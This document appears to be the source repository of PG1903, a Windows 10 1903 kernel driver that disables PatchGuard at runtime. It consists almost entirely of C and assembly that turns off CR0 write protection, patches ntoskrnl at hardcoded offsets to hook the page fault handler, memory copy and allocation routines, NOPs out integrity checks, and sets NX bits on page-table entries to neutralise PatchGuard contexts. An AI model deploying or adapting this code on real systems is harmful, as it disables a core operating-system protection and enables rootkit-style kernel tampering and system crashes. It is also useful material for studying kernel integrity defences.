Project Path: arc_gmh5225_PG1903_3x9jf45q

Source Tree:

```txt
arc_gmh5225_PG1903_3x9jf45q
├── README.md
├── SOURCES
├── amd64
│   └── x64asm.asm
├── common.h
├── entry.c
├── scan.c
└── scan.h

```

`README.md`:

```md
# PG1903

Disable PatchGuard in real time for Win10 1903.

Based on setting context pages NX method.

# References

Shark, https://github.com/9176324/Shark

DisableWin10PatchguardPoc, https://github.com/killvxk/DisableWin10PatchguardPoc

PgResarch, https://github.com/tandasat/PgResarch

```

`SOURCES`:

```
TARGETNAME=PG1903
TARGETTYPE=DRIVER

INCLUDES= .; \

SOURCES=entry.c \
        scan.c


AMD64_SOURCES=amd64\x64asm.asm


```

`amd64/x64asm.asm`:

```asm
option casemap:none

MemCpyEbd Proto

EXTERN DebugData: ptr qword
EXTERN g_PTE_BASE: qword
EXTERN g_PDE_BASE: qword

NT_BASE equ 0FFFFF8017a0b8000h

.data

.code


Asm_test	Proc
        ret
Asm_test 	Endp


Asm_WriteProtectDisable	Proc
        cli
        mov rax, cr0
        and rax, not 10000h
        mov cr0, rax
        ret
Asm_WriteProtectDisable 	Endp


Asm_WriteProtectEnable	Proc
        mov rax, cr0
        or rax, 10000h
        mov cr0, rax
        sti
        ret
Asm_WriteProtectEnable 	Endp


;fffff807`16a98c50  00000000`00000011	error code
;fffff807`16a98c58  ffff8986`e513000c	eip
;fffff807`16a98c60  00000000`00000010	cs
;fffff807`16a98c68  00000000`00010246	eflags 10000001001000110
;fffff807`16a98c70  fffff807`16a98c88	esp
;fffff807`16a98c78  00000000`00000018	ss
;fffff807`16a98c80  fffff807`16a9b000	align
Asm_hook_PageFault	Proc


        push rcx

        mov rax, [rsp + 10h]      ;error code
        cmp rax, 11h
        jnz @back


        mov rax, [rsp + 18h]    ;addr
        mov eax, dword ptr [rax]
        cmp eax, 1131482eh
        jnz @back

        mov [DebugData + 30h], rdx
;----------------------------------------
        mov rax, [DebugData+10h]
        inc rax
        mov [DebugData+10h], rax
        mov [DebugData+18h], rcx

        mov rax, [rsp + 18h]    ;addr
        mov [DebugData+20h], rax

        mov rax, [rsp+28h]  ;efl
        push rax
        popfq
        mov rax, [rsp+38h]  ;ss
        mov ss, ax
        mov rax, [rsp+30h]  ;rsp
        mov [DebugData+40h], rax
        mov rsp, rax

        ret
;-----------------------------------------

@back:
        pop rcx
        pop rax
        push rbp
        sub rsp, 158h
        lea rbp, [rsp+80h]
        sub rsp, 8
        mov dword ptr [rsp], (NT_BASE+ 1CA450h)and 0ffffffffh
        mov dword ptr [rsp+4], NT_BASE shr 32
        ret
Asm_hook_PageFault 	Endp


Asm_hook_memcpy_entry       Proc
        push rax
        push rcx
        push rdx
        push r8
        push r9
        push r10

        sub rsp, 20h
        call MemCpyEbd
        add rsp, 20h

        pop r10
        pop r9
        pop r8
        pop rdx
        pop rcx
        pop rax

        mov r11, rcx
        sub rdx, rcx
        jb @1

        sub rsp, 8
        mov dword ptr [rsp], (NT_BASE+ 1CF4D0h)and 0ffffffffh
        mov dword ptr [rsp+4], NT_BASE shr 32
        cmp r8, 4fh
        ret
@1:
        sub rsp, 8
        mov dword ptr [rsp], (NT_BASE+ 1CF66Eh)and 0ffffffffh
        mov dword ptr [rsp+4], NT_BASE shr 32
        ret

Asm_hook_memcpy_entry       Endp

Asm_hook_exAllocate_entry	Proc
        test edi, edi
        jnz @ret
        cmp rsi, 8000h
        jb @ret

        mov rcx, rbx
        mov rax, 0ffffffffffffh
        and rcx, rax
        shr rcx, 21
        shl rcx, 3
        mov rax, g_PDE_BASE
        add rax, rcx
        mov rcx, rax        ;ppde
        mov rax, [rcx]       ;pde
        test rax, 80h
        jnz @ret

            mov rcx, rbx
            mov rax, 0ffffffffffffh
            and rcx, rax
            shr rcx, 12
            shl rcx, 3
            mov rax, g_PTE_BASE
            add rax, rcx
            mov rcx, rax        ;ppte
                   push rcx
                   mov rax, [rcx]       ;pte
                   mov rcx, 08000000000000000h
                   or  rax, rcx
                   pop rcx
                   mov [rcx], rax

@ret:
        mov     rbp, [rsp+58h]
        mov     rax, rbx
        mov     rbx, [rsp+50h]
        mov     rsi, [rsp+60h]
        add     rsp, 30h
        pop     r15
        pop     r14
        pop     rdi
        ret
Asm_hook_exAllocate_entry 	Endp

Asm_hook_MmAllocateIndependentPages      Proc
        mov rax, [rsp+8]
        pop rax
        sub rsp, 28h

        cmp rcx, 8000h
        jb  @r
        xor r9d, r9d
        xor r8d, r8d
        call @to
;-------------------------------
        push rax
        push rcx

        mov rcx, rax
        mov rax, 0ffffffffffffh
        and rcx, rax
        shr rcx, 21
        shl rcx, 3
        mov rax, g_PDE_BASE
        add rax, rcx
        mov rcx, rax        ;ppde
        mov rax, [rcx]       ;pde
        test rax, 80h
        jnz @pop

            mov rcx, [rsp + 8]

            mov rax, 0ffffffffffffh
            and rcx, rax
            shr rcx, 12
            shl rcx, 3
            mov rax, g_PTE_BASE
            add rax, rcx
            mov rcx, rax        ;ppte
                   push rcx
                   mov rax, [rcx]       ;pte
                   mov rcx, 08000000000000000h
                   or  rax, rcx
                   pop rcx
           mov [rcx], rax
@pop:
        pop rcx
        pop rax
        add rsp, 28h
        ret

@r:
        xor r9d, r9d
        xor r8d, r8d
        call @to
        add rsp, 28h
        ret
@to:
        sub rsp, 8
        mov dword ptr [rsp], (NT_BASE+ 1044E8h)and 0ffffffffh
        mov dword ptr [rsp+4], NT_BASE shr 32
        ret
Asm_hook_MmAllocateIndependentPages       Endp

Asm_hook_hMmSetPageProtection       Proc
        cmp rdx, 8000h
        jb  @r
        cmp r8d, 40h
        jnz @r

        mov r8d, 4
@r:
        pop rax
        mov     [rsp+20h], rbx
        push    rbp
        push    rsi
        push    rdi
        push    r14
        push    r15
        sub     rsp, 100h
        mov     rax, [NT_BASE + 427F70h]
        sub rsp, 8
        mov dword ptr [rsp], (NT_BASE+ 12A75Ah)and 0ffffffffh
        mov dword ptr [rsp+4], NT_BASE shr 32
        ret
Asm_hook_hMmSetPageProtection       Endp

END

```

`common.h`:

```h
#ifndef COMMON_H
#define COMMON_H

//http://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/bigpool_entry.htm
typedef struct _SYSTEM_BIGPOOL_ENTRY
{
    union {
        PVOID VirtualAddress;
        ULONG_PTR NonPaged : 1;
    };
    ULONG_PTR SizeInBytes;
    union {
        UCHAR Tag [4];
        ULONG TagUlong;
    };
} SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;
typedef struct _SYSTEM_BIGPOOL_INFORMATION
{
    ULONG Count;
    SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
} SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;

NTSTATUS
ZwQuerySystemInformation (
    ULONG64 SystemInformationClass,
    PSYSTEM_BIGPOOL_INFORMATION SystemInformation,
    ULONG64 SystemInformationLength,
    ULONG64 *ReturnLength);

typedef struct _MMPTE_HARDWARE            // 18 elements, 0x8 bytes (sizeof)
          {
/*0x000*/     UINT64       Valid : 1;               // 0 BitPosition
/*0x000*/     UINT64       Dirty1 : 1;              // 1 BitPosition
/*0x000*/     UINT64       Owner : 1;               // 2 BitPosition
/*0x000*/     UINT64       WriteThrough : 1;        // 3 BitPosition
/*0x000*/     UINT64       CacheDisable : 1;        // 4 BitPosition
/*0x000*/     UINT64       Accessed : 1;            // 5 BitPosition
/*0x000*/     UINT64       Dirty : 1;               // 6 BitPosition
/*0x000*/     UINT64       LargePage : 1;           // 7 BitPosition
/*0x000*/     UINT64       Global : 1;              // 8 BitPosition
/*0x000*/     UINT64       CopyOnWrite : 1;         // 9 BitPosition
/*0x000*/     UINT64       Unused : 1;              // 10 BitPosition
/*0x000*/     UINT64       Write : 1;               // 11 BitPosition
/*0x000*/     UINT64       PageFrameNumber : 36;    // 12 BitPosition
/*0x000*/     UINT64       ReservedForHardware : 4; // 48 BitPosition
/*0x000*/     UINT64       ReservedForSoftware : 4; // 52 BitPosition
/*0x000*/     UINT64       WsleAge : 4;             // 56 BitPosition
/*0x000*/     UINT64       WsleProtection : 3;      // 60 BitPosition
/*0x000*/     UINT64       NoExecute : 1;           // 63 BitPosition
          }MMPTE_HARDWARE, *PMMPTE_HARDWARE;

#define MM_PTE_VALID_MASK         0x1
#if defined(NT_UP)
#define MM_PTE_WRITE_MASK         0x2
#else
#define MM_PTE_WRITE_MASK         0x800
#endif
#define MM_PTE_OWNER_MASK         0x4
#define MM_PTE_WRITE_THROUGH_MASK 0x8
#define MM_PTE_CACHE_DISABLE_MASK 0x10
#define MM_PTE_ACCESS_MASK        0x20
#if defined(NT_UP)
#define MM_PTE_DIRTY_MASK         0x40
#else
#define MM_PTE_DIRTY_MASK         0x42
#endif
#define MM_PTE_LARGE_PAGE_MASK    0x80
#define MM_PTE_GLOBAL_MASK        0x100
#define MM_PTE_COPY_ON_WRITE_MASK 0x200
#define MM_PTE_PROTOTYPE_MASK     0x400
#define MM_PTE_TRANSITION_MASK    0x800

typedef struct _MMPTE         // 1 elements, 0x8 bytes (sizeof)
          {
/*0x000*/     union {
                        MMPTE_HARDWARE  Hard;
                        ULONG64         Long;
                    } u; // 9 elements, 0x8 bytes (sizeof)
          }MMPTE, *PMMPTE;

extern ULONG64 g_NT_BASE;
extern ULONG64 g_PTE_BASE;
extern ULONG64 g_PDE_BASE;
extern ULONG64 g_PPE_BASE;
extern ULONG64 g_PXE_BASE;

void Asm_test();
void Asm_WriteProtectDisable();
void Asm_WriteProtectEnable();
void Asm_hook_PageFault();
void Asm_hook_exAllocate_entry();
void Asm_hook_memcpy_entry();
void Asm_hook_MmAllocateIndependentPages();
void Asm_hook_hMmSetPageProtection();
void Asm_hook_MiWriteValidPteNewProtectio();
void Asm_fault();
extern ULONG64 Except_addr;
#endif // COMMON_H


```

`entry.c`:

```c
#include <ntddk.h>
#include "common.h"
#include "scan.h"

ULONG64 g_NT_BASE = 0xFFFFF8017a0b8000;
ULONG64 g_PTE_BASE;
ULONG64 g_PDE_BASE;
ULONG64 g_PPE_BASE;
ULONG64 g_PXE_BASE;


VOID DriverUnload(PDRIVER_OBJECT driver)
{
    DbgPrint("Driver is unloading...\r\n");
}

//ed nt!Kd_SXS_Mask 0
//ed nt!Kd_FUSION_Mask 0


// 50                              | push rax                              |
// 48:B8 8967452301000000          | mov rax,123456789                     |
// 50                              | push rax                              |
// C3                              | ret                                   |

//fffff807`14084440 55              push    rbp
//fffff807`14084441 4881ec58010000  sub     rsp,158h
//fffff807`14084448 488dac2480000000 lea     rbp,[rsp+80h]
//fffff807`14084450 c645ab01        mov     byte ptr [rbp-55h],1
//fffff807`14084454 488945b0        mov     qword ptr [rbp-50h],rax
//fffff807`14084458 48894db8        mov     qword ptr [rbp-48h],rcx
void hookPageFault()
{
    *(PUCHAR)(g_NT_BASE + 0x1CA440) = 0x50;
    *(PUSHORT)(g_NT_BASE + 0x1CA441) = 0xb848;
    *(PULONG64)(g_NT_BASE + 0x1CA443) = (ULONG64)Asm_hook_PageFault;
    *(PUSHORT)(g_NT_BASE + 0x1CA44b) = 0xc350;
}


/*
 | 49:BB 8967452301000000          | mov r11,123456789                     |
 | 41:FFE3                         | jmp r11                               |
 90 90 90
 */
void hookMemCpy()
{
    *(PUSHORT)(g_NT_BASE + 0xFFFFF807140894C0 - 0xFFFFF80713EBA000) = 0xbb49;
    *(PULONG64)(g_NT_BASE + 0xFFFFF807140894C0 - 0xFFFFF80713EBA000 + 2) = (ULONG64)Asm_hook_memcpy_entry;
    *(PULONG)(g_NT_BASE + 0xFFFFF807140894C0 - 0xFFFFF80713EBA000 + 10) = 0x90e3ff41;
    *(PUSHORT)(g_NT_BASE + 0xFFFFF807140894C0 - 0xFFFFF80713EBA000 + 14) = 0x9090;
}


void MemCpyEbd(ULONG64 des, ULONG64 src, ULONG64 size)
{

}

/*
POOLCODE:FFFFF80714224079 48 8B 6C 24 58                          mov     rbp, [rsp+48h+arg_8]
POOLCODE:FFFFF8071422407E 48 8B C3                                mov     rax, rbx
POOLCODE:FFFFF80714224081 48 8B 5C 24 50                          mov     rbx, [rsp+48h+arg_0]
POOLCODE:FFFFF80714224086 48 8B 74 24 60                          mov     rsi, [rsp+48h+arg_10]
POOLCODE:FFFFF8071422408B 48 83 C4 30                             add     rsp, 30h
POOLCODE:FFFFF8071422408F 41 5F                                   pop     r15
POOLCODE:FFFFF80714224091 41 5E                                   pop     r14
*/
void hookExAllocatePoolWithTag()
{
    *(PUSHORT)(g_NT_BASE + 0x36A079) = 0xb848;
    *(PULONG64)(g_NT_BASE + 0x36A07b) = (ULONG64)Asm_hook_exAllocate_entry;
    *(PUSHORT)(g_NT_BASE + 0x36A07b + 8) = 0xc350;
}

void hookMmAllocateIndependentPages()
{
    *(PUCHAR)(g_NT_BASE + 0xFFFFF80713FBD450 - 0xFFFFF80713EBA000) = 0x50;
    *(PUSHORT)(g_NT_BASE + 0xFFFFF80713FBD450 - 0xFFFFF80713EBA000 + 1) = 0xb848;
    *(PULONG64)(g_NT_BASE + 0xFFFFF80713FBD450 - 0xFFFFF80713EBA000 + 3) = (ULONG64)Asm_hook_MmAllocateIndependentPages;
    *(PUSHORT)(g_NT_BASE + 0xFFFFF80713FBD450 - 0xFFFFF80713EBA000 + 11) = 0xc350;
}

void hookMmSetPageProtection(){
    *(PUCHAR)(g_NT_BASE + 0xFFFFF80713FE4740 - 0xFFFFF80713EBA000) = 0x50;
    *(PUSHORT)(g_NT_BASE + 0xFFFFF80713FE4740 - 0xFFFFF80713EBA000 + 1) = 0xb848;
    *(PULONG64)(g_NT_BASE + 0xFFFFF80713FE4740 - 0xFFFFF80713EBA000 + 3) = (ULONG64)Asm_hook_MmAllocateIndependentPages;
    *(PUSHORT)(g_NT_BASE + 0xFFFFF80713FE4740 - 0xFFFFF80713EBA000 + 11) = 0xc350;
}

void static_context_hook()
{
    ULONG64 g_ctx;
    *(PUCHAR)(g_NT_BASE + 0x1A4629) = 0x90; //if ccb_twin
    *(PULONG)(g_NT_BASE + 0x1A462a) = 0x90909090;
    *(PUSHORT)(g_NT_BASE + 0x1A47E5) = 0xe990; //ccb

    g_ctx = *(PULONG64)(g_NT_BASE + 0x56F348); //g_ctx
    *(PULONG64)g_ctx = -1;
    *(PULONG64)(g_NT_BASE + 0x56F348) = 0;

    *(PUCHAR)(g_NT_BASE + 0xFFFFF80713FBC3A0 - 0xFFFFF80713EBA000) = 0xc3;//KiDispatchCallout
}

ULONG64 DebugData[0x10] = {
    0x2C0C6AE7D1F94A9F,
    0xB83491EF07C6E12F,
};


//C:\Users\zhouhe\Desktop\PG1903.sys
NTSTATUS 
  DriverEntry( 
    PDRIVER_OBJECT  driver,
    PUNICODE_STRING RegistryPath
    )
{
    DbgPrint("Driver Entered!\n");
    //Asm_test();
    DbgPrint("DebugData: %p\n", DebugData);
    driver->DriverUnload = DriverUnload;

    g_PTE_BASE = *(PULONG64)(g_NT_BASE + 0xCB3C);
    g_PDE_BASE = (g_PTE_BASE + ((g_PTE_BASE & 0xffffffffffff) >> 9));
    g_PPE_BASE = (g_PTE_BASE + ((g_PDE_BASE & 0xffffffffffff) >> 9));
    g_PXE_BASE = (g_PTE_BASE + ((g_PPE_BASE & 0xffffffffffff) >> 9));
    DbgPrint("pte at: %p\n", g_PTE_BASE);
    DbgPrint("pde at: %p\n", g_PDE_BASE);
    DbgPrint("ppe at: %p\n", g_PPE_BASE);
    DbgPrint("pxe at: %p\n", g_PXE_BASE);
    EnumSysRegions();
    ScanBigPool();
    Asm_WriteProtectDisable();
    static_context_hook();
    hookExAllocatePoolWithTag();
    hookMmAllocateIndependentPages();
    hookMmSetPageProtection();
    hookPageFault();
    hookMemCpy();   //seems this can touch off the PG quickly
    Asm_WriteProtectEnable();
	return STATUS_SUCCESS;
}

/* magic nums from https://github.com/tandasat/PgResarch
 * ULONG64 pgContextAddr = bugCheckParameter[0] - 0xA3A03F5891C8B4E8;
reasonInfoAddr = bugCheckParameter[1] - 0xB3B74BDEE4453415;
*/

```

`scan.c`:

```c
#include <ntddk.h>
#include "common.h"
#include "scan.h"
extern ULONG64 g_NT_BASE;

PVOID GetVirtualAddressMappedByPte(PMMPTE pte)
{
    return (PVOID)(((((ULONG64)pte - g_PTE_BASE) >> 3) << 12) | 0xffff000000000000);
}
PVOID GetVirtualAddressMappedByPde(PMMPTE pde)
{
    return (PVOID)(((((ULONG64)pde - g_PDE_BASE) >> 3) << 21) | 0xffff000000000000);
}
PVOID GetVirtualAddressMappedByPpe(PMMPTE ppe)
{
    return (PVOID)(((((ULONG64)ppe - g_PPE_BASE) >> 3) << 30) | 0xffff000000000000);
}
PVOID GetVirtualAddressMappedByPxe(PMMPTE pxe)
{
    return (PVOID)(((((ULONG64)pxe - g_PXE_BASE) >> 3) << 39) | 0xffff000000000000);
}
PMMPTE GetPxeAddress(PVOID addr)
{
    return (PMMPTE)(((((ULONG64)addr & 0xffffffffffff) >> 39) << 3) + g_PXE_BASE);
}
PMMPTE GetPpeAddress(PVOID addr)
{
    return (PMMPTE)(((((ULONG64)addr & 0xffffffffffff) >> 30) << 3) + g_PPE_BASE);
}
PMMPTE GetPdeAddress(PVOID addr)
{
    return (PMMPTE)(((((ULONG64)addr & 0xffffffffffff) >> 21) << 3) + g_PDE_BASE);
}
PMMPTE GetPteAddress(PVOID addr)
{
    return (PMMPTE)(((((ULONG64)addr & 0xffffffffffff) >> 12) << 3) + g_PTE_BASE);
}

NTSTATUS ScanBigPool()
{
    PSYSTEM_BIGPOOL_INFORMATION pBigPoolInfo;
    ULONG64 ReturnLength = 0;
    NTSTATUS status;
    ULONG i = 0;
    int num=0;


    pBigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, sizeof(SYSTEM_BIGPOOL_INFORMATION), 'ttt');
    status = ZwQuerySystemInformation(0x42/*SystemBigPoolInformation*/, pBigPoolInfo, sizeof(SYSTEM_BIGPOOL_INFORMATION), &ReturnLength);
    //DbgPrint("pBigPoolInfo->Count - %d \n", pBigPoolInfo->Count);
    //DbgPrint("ReturnLength - %p \n", ReturnLength);
    ExFreePool(pBigPoolInfo);
    pBigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, ReturnLength + 0x1000, 'ttt');
    if (!pBigPoolInfo)
        return STATUS_UNSUCCESSFUL;
    status = ZwQuerySystemInformation(0x42, pBigPoolInfo, ReturnLength + 0x1000, &ReturnLength);
    if (status != STATUS_SUCCESS)
    {
        DbgPrint("query BigPoolInfo failed: %p\n", status);
        return status;
    }
    DbgPrint("pBigPoolInfo: %p\n", pBigPoolInfo);
    for (i=0; i < pBigPoolInfo->Count; i++)
    {
        PVOID addr = pBigPoolInfo->AllocatedInfo[i].VirtualAddress;
        ULONG64 size = (ULONG64)pBigPoolInfo->AllocatedInfo[i].SizeInBytes;
        PULONG64 ppte = (PULONG64)GetPteAddress(addr);
        ULONG64 pte = *ppte;
        PULONG64 ppde = (PULONG64)GetPdeAddress(addr);
        ULONG64 pde = *ppde;


        if ( size >= 0x8000)
        {
            if (pde & 0x80){//big page

            } else {

                    if ((pte & 0x8000000000000000) == 0 && (pte & 1)) {
                        pte |= 0x8000000000000000;
                        *ppte = pte;
                        DbgPrint("addr: %p, size: %p, pte: %p, nom\n", addr, size, pte);
                        num += 1;
                }
            }
        }
    }
    DbgPrint("num: %d\n", num);
    ExFreePool(pBigPoolInfo);
    return status;
}


/* Following are from https://github.com/9176324/Shark
*
* Copyright (c) 2015 - 2019 by blindtiger. All rights reserved.
*
* The contents of this file are subject to the Mozilla Public License Version
* 2.0 (the "License")); you may not use this file except in compliance with
* the License. You may obtain a copy of the License at
* http://www.mozilla.org/MPL/
*
* Software distributed under the License is distributed on an "AS IS" basis,
* WITHOUT WARRANTY OF ANY KIND, either express or implied. SEe the License
* for the specific language governing rights and limitations under the
* License.
*
* The Initial Developer of the Original e is blindtiger.
*
*/
VOID
InitializeSystemPtesBitMap(
    __inout PMMPTE BasePte,
    __in PFN_NUMBER NumberOfPtes,
    __out PRTL_BITMAP BitMap
)
{
    PMMPTE PointerPxe = NULL;
    PMMPTE PointerPpe = NULL;
    PMMPTE PointerPde = NULL;
    PMMPTE PointerPte = NULL;
    PVOID PointerAddress = NULL;
    ULONG BitNumber = 0;
    PVOID BeginAddress = NULL;
    PVOID EndAddress = NULL;

    /*
    PatchGuard Context pages allocate by MmAllocateIndependentPages
    */

#define VALID_PTE_SET_BITS \
            ( MM_PTE_VALID_MASK | MM_PTE_DIRTY_MASK | MM_PTE_WRITE_MASK | MM_PTE_ACCESS_MASK)

#define VALID_PTE_UNSET_BITS \
            ( MM_PTE_WRITE_THROUGH_MASK | MM_PTE_CACHE_DISABLE_MASK | MM_PTE_COPY_ON_WRITE_MASK )

    BeginAddress = GetVirtualAddressMappedByPte(BasePte);
//    __debugbreak();
    EndAddress = GetVirtualAddressMappedByPte(BasePte + NumberOfPtes);

    PointerAddress = BeginAddress;

    do {
        PointerPxe = GetPxeAddress(PointerAddress);

        if (0 != PointerPxe->u.Hard.Valid) {
            PointerPpe = GetPpeAddress(PointerAddress);

            if (0 != PointerPpe->u.Hard.Valid) {
                PointerPde = GetPdeAddress(PointerAddress);

                if (0 != PointerPde->u.Hard.Valid) {
                    if (0 == PointerPde->u.Hard.LargePage) {
                        PointerPte = GetPteAddress(PointerAddress);

                        if (0 != PointerPte->u.Hard.Valid) {
                            if (0 == PointerPte->u.Hard.NoExecute) {
                                if (VALID_PTE_SET_BITS == (PointerPte->u.Long & VALID_PTE_SET_BITS)) {
                                    if (0 == (PointerPte->u.Long & VALID_PTE_UNSET_BITS)) {
                                        BitNumber = (ULONG)(PointerPte - BasePte);
                                        RtlSetBit(BitMap, BitNumber);
                                    }
                                }
                            }
                        }

                        PointerAddress = GetVirtualAddressMappedByPte(PointerPte + 1);
                    }
                    else {
                        PointerAddress = GetVirtualAddressMappedByPde(PointerPde + 1);
                    }
                }
                else {
                    PointerAddress = GetVirtualAddressMappedByPde(PointerPde + 1);
                }
            }
            else {
                PointerAddress = GetVirtualAddressMappedByPpe(PointerPpe + 1);
            }
        }
        else {
            PointerAddress = GetVirtualAddressMappedByPxe(PointerPxe + 1);
        }
    } while ((ULONG_PTR)PointerAddress < (ULONG_PTR)EndAddress);
}

VOID EnumSysRegions()
{
    PMMPTE BasePte;
    PFN_NUMBER NumberOfPtes;
    ULONG BitMapSize;
    ULONG64 system_pte_strc;
    PRTL_BITMAP BitMap;
    ULONG HintIndex = 0;
    ULONG StartingRunIndex = 0;
    PVOID BaseAddress;
    ULONG64 RegionSize;
    system_pte_strc = 0xFFFFF8071431D780 - 0xFFFFF80713EBA000 + g_NT_BASE;
    DbgPrint("system_pte_strc: %p", system_pte_strc);
    BasePte = (PMMPTE)*(PULONG64)(system_pte_strc + 0x10);
    NumberOfPtes = *(PULONG64)(system_pte_strc) * 8;
    BitMapSize =
            sizeof(RTL_BITMAP) + (ULONG)((((NumberOfPtes + 1) + 31) / 32) * 4);

    BitMap = ExAllocatePoolWithTag(NonPagedPool, BitMapSize, 'BMP');
    RtlInitializeBitMap(
        BitMap,
        (PULONG)(BitMap + 1),
        (ULONG)(NumberOfPtes + 1));
    RtlClearAllBits(BitMap);
    InitializeSystemPtesBitMap(
                BasePte,
                NumberOfPtes,
                BitMap);
//__debugbreak();
    do {
        HintIndex = RtlFindSetBits(
                    BitMap,
                    1,
                    HintIndex);

        if (MAXULONG != HintIndex) {
            RtlFindNextForwardRunClear(
                        BitMap,
                        HintIndex,
                        &StartingRunIndex);

            RtlClearBits(BitMap, HintIndex, StartingRunIndex - HintIndex);


            BaseAddress =
                    GetVirtualAddressMappedByPte(BasePte + HintIndex);
            RegionSize =
                    (SIZE_T)(StartingRunIndex - HintIndex) * 0x1000;

            if (RegionSize > 0x8000) {
                DbgPrint(
                            "found region in system ptes < %p - %08x >\n",
                            BaseAddress,
                            RegionSize);
                /*****************handle it*****************/
                GetPpeAddress(BaseAddress)->u.Long |= 0x8000000000000000;
            }

            HintIndex = StartingRunIndex;
        }
    } while (HintIndex < NumberOfPtes);

    ExFreePool(BitMap);
}

```

`scan.h`:

```h
#ifndef SCAN_H
#define SCAN_H

VOID
InitializeSystemPtesBitMap(
    __inout PMMPTE BasePte,
    __in PFN_NUMBER NumberOfPtes,
    __out PRTL_BITMAP BitMap
);

VOID EnumSysRegions();
NTSTATUS ScanBigPool();
#endif // SCAN_H

```